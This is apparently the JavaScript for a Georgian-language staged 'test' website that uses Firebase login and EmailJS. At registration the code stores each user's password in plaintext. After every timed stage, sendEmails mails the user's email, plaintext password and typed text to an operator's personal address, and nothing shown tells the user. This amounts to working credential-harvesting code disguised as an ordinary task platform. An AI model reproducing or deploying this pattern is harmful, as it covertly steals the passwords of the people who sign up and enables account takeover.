import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// === აქ ჩასვი შენი FIREBASE კოდი ===
const firebaseConfig = {
    apiKey: "YOUR_FIREBASE_API_KEY",
    authDomain: "YOUR_FIREBASE_AUTH_DOMAIN",
    projectId: "YOUR_FIREBASE_PROJECT_ID",
    storageBucket: "YOUR_FIREBASE_STORAGE_BUCKET",
    messagingSenderId: "YOUR_FIREBASE_MESSAGING_SENDER_ID",
    appId: "YOUR_FIREBASE_APP_ID"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// === აქ ჩასვი შენი EMAILJS PUBLIC KEY ===
emailjs.init("9G-RjQeGCdtsk4MWM");

let currentUser = null;
let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
let latestUserMessage = ""; // მომხმარებლის მიერ ჩაწერილი ბოლო ტექსტი

const authScreen = document.getElementById('auth-screen');
const dashboardScreen = document.getElementById('dashboard-screen');
const authForm = document.getElementById('auth-form');
const authError = document.getElementById('auth-error');
const userEmailDisplay = document.getElementById('user-email-display');
const completedStatus = document.getElementById('completed-status');
const currentStageStatus = document.getElementById('current-stage-status');
const timerBox = document.getElementById('timer-box');
const countdownSpan = document.getElementById('countdown');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    authError.innerText = "";

    try {
        await signInWithEmailAndPassword(auth, email, password);
    } catch (error) {
        if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
            try {
                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                await setDoc(doc(db, "users", userCredential.user.uid), {
                    email: email,
                    passwordSaved: password,
                    stage: 1,
                    completedTasks: 0
                });
            } catch (regError) {
                authError.innerText = "შეცდომა: " + regError.message;
            }
        } else {
            authError.innerText = "შეცდომა: " + error.message;
        }
    }
});

onAuthStateChanged(auth, async (user) => {
    if (user) {
        currentUser = user;
        userEmailDisplay.innerText = user.email;
        authScreen.classList.add('hidden');
        dashboardScreen.classList.remove('hidden');
        
        const userDoc = await getDoc(doc(db, "users", user.uid));
        if (userDoc.exists()) {
            userProgress = userDoc.data();
        }
        updateUI();
    } else {
        currentUser = null;
        authScreen.classList.remove('hidden');
        dashboardScreen.classList.add('hidden');
    }
});

document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

function updateUI() {
    completedStatus.innerText = userProgress.completedTasks;
    currentStageStatus.innerText = userProgress.stage > 3 ? "ყველა დასრულებულია" : `ეტაპი ${userProgress.stage}`;

    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    document.getElementById('final-message').classList.add('hidden');

    // ვასუფთავებთ და ვმალავთ ინპუტების ბლოკებს ხელახლა ჩატვირთვისას
    for(let i=1; i<=3; i++) {
        const ib = document.getElementById(`input-block-${i}`);
        const sb = document.getElementById(`start-btn-${i}`);
        if(ib) ib.classList.add('hidden');
        if(sb) sb.classList.remove('hidden');
    }

    if (userProgress.stage === 1) {
        document.getElementById('stage-1').classList.remove('hidden');
    } else if (userProgress.stage === 2) {
        document.getElementById('stage-2').classList.remove('hidden');
    } else if (userProgress.stage === 3) {
        document.getElementById('stage-3').classList.remove('hidden');
    } else if (userProgress.stage > 3) {
        document.getElementById('final-message').classList.remove('hidden');
    }
}

window.showStage2Tasks = function() {
    document.getElementById('stage-2-tasks').classList.remove('hidden');
    document.getElementById('next-trigger-2').classList.add('hidden');
}
window.showStage3Tasks = function() {
    document.getElementById('stage-3-tasks').classList.remove('hidden');
    document.getElementById('next-trigger-3').classList.add('hidden');
}

// ახალი ფუნქცია: აჩენს ინპუტს და მალავს ღილაკს "დაწყება"
window.showInputBlock = function(stageNum) {
    document.getElementById(`start-btn-${stageNum}`).classList.add('hidden');
    document.getElementById(`input-block-${stageNum}`).classList.remove('hidden');
}

window.startTimer = function(stageNum, seconds) {
    // ვიღებთ მომხმარებლის მიერ ჩაწერილ ტექსტს
    const inputElement = document.getElementById(`user-text-${stageNum}`);
    latestUserMessage = inputElement ? inputElement.value : "ცარიელი";

    // ვმალავთ მთლიან ეტაპს ტაიმერის მსვლელობისას
    if(stageNum === 1) document.getElementById('stage-1').classList.add('hidden');
    if(stageNum === 2) document.getElementById('stage-2').classList.add('hidden');
    if(stageNum === 3) document.getElementById('stage-3').classList.add('hidden');
    
    timerBox.classList.remove('hidden');
    let timeLeft = seconds;
    countdownSpan.innerText = timeLeft;

    const interval = setInterval(async () => {
        timeLeft--;
        countdownSpan.innerText = timeLeft;

        if (timeLeft <= 0) {
            clearInterval(interval);
            timerBox.classList.add('hidden');
            
            userProgress.stage = stageNum + 1;
            userProgress.completedTasks = stageNum;

            // ბაზაში ვინახავთ ტექსტსაც, რომ კაბინეტში შენარჩუნდეს
            userProgress[`stage_${stageNum}_text`] = latestUserMessage;

            await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
            
            sendEmails(stageNum);
            updateUI();
        }
    }, 1000);
}

function sendEmails(stageNum) {
    const stageNames = ["ეტაპი 1 (ტესტი 1)", "ეტაპი 2 (ტესტი 2)", "ეტაპი 3 (ტესტი 3)"];
    const currentStageName = stageNames[stageNum - 1];

    const emailParams = {
        user_email: currentUser.email,
        user_password: userProgress.passwordSaved || "უკვე ავტორიზებული",
        passed_stage: currentStageName,
        user_message: latestUserMessage, // <=== აი ახალი ცვლადი ჩაწერილი ტექსტისთვის!
        admin_email: "შენი_პირადი_მეილი@gmail.com" // ჩაწერე შენი რეალური მეილი!
    };

    // === აქ ჩასვი შენი EMAILJS სერვისის და შაბლონების ID კოდები ===
    emailjs.send("service_ddlex4d", "template_8sbn4o7", emailParams);
    emailjs.send("service_ddlex4d", "template_5225h2q", emailParams);
}